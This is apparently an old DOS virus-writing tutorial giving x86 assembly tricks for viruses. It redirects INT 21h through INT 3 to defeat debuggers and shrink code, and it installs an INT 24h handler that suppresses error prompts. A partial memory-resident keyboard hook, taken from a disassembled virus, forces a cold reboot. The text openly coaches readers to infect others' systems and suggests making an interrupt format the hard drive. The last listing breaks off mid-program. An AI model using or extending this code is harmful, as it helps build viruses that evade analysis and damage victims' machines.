                             Programming Tricks
                             컴컴컴컴컴컴컴컴컴


      There are many possible tricks, but I won't get into all of them.  The
   one thing that you  really need to know, is that all debuggers won't call
   interrupt 8,  and only  debuggers  call  interrupts 1 and 3.  Using  this
   knowledge, you should be able to come up with  some interesting solutions
   to your problem of people trying to get your source code.


        Take this code for example:


        mov     ax,3521h                ; Get the INT 21h address
        int     21h                     ; Do it!

        push    es                      ; Move the extra segment to the
        pop     ds                      ; Data segment
        xchg    bx, dx                  ; Set up the INT 21h address
        mov     ax, 2503h               ; This will make INT 21h = INT 3
        int     21h                     ; Do it!
                


      It's one that I  prefer to use.  Anybody who  actually knows anything,
   will realize what you're doing, and single-step over this code, but there
   are people  who don't  know what is  going on, and who  will consequently
   infect  their  system.  This  code has a  double value.  Not only will it
   fuck up the debugger when they try to trace  through it, but it will also
   make your code smaller if  you use interrupt 21h a lot.  The reason? It's
   very  elementary, INT 21h is two  bytes long 'CD 21',  but interrupt 3 is
   only 'CC'.  So, after  you code this, just use int 3, instead of int 21h.
   The code is 14 bytes in  length, so if  you use int 21h 15 times or more,
   then the code is definatly worth it.

      Another  trick is for  those annoying  errors of INT 24h, like general
   error, etc.  If your virus is of that nature,  that this may  happen when
   some- one runs the file, then use this code:


        mov     ax, 3524h               ; Get INT 24h address
        int     3h                      ; The 'Old' INT 21h
                
        push    cs                      ; The code needs CS = DS
        pop     ds
        lea     dx, [bp+INT24]          ; Set up the new INT 24h
        mov     ax, 2524h               ; Function 25 - Set INT
        int     3h                      ; Do it!
                
INT24:
        mov     al, 0003h               ; This is the new INT 24h
        iret                            ; Interrupt Return


      You could also disable other interrupts, or  have them do whatever you
   want.  Maybe you  want to set  interrupt one to format  the hard drive or
   something.  Or, you could get creative, like this program:


.model  tiny
.code
org     100h

        mov     dx,offset logon                 ; Load the message into mem.
        int     21h                             ; Print it!

        mov     ax, 0B0B0h                      ; Check to see if we're in mem
        int     9                               ; The trapped vector
        cmp     cx, 0B0B0h                      ; The check byte
        jz      exit                            ; If we're in mem., then quit

        mov     ax, 3509h                       ; Get the address for int 9
        int     21h                             ; Do it!
        
        mov     word ptr [old9+1], bx           ; Save the segment:offset for
        mov     word ptr [old9+3], es           ; for later use

        mov     ax, 2509h                       ; Set int vector

      What it will do, is go memory resident, beep  three times and print 'I
   aM a  CooLie!!!' on the  screen.  When  you press  ALT-CTRL-DEL,  it will
   intercept  the  function,  and print  'Greetings to all viral writters!',
   then do a coldboot.  It was  taken from the  Otto6 Virus, disassembled by
   The Additude Adjuster  of Virulent Graffiti.  There is no limit to what a
   virus can do.  It's limited only by your imagination.
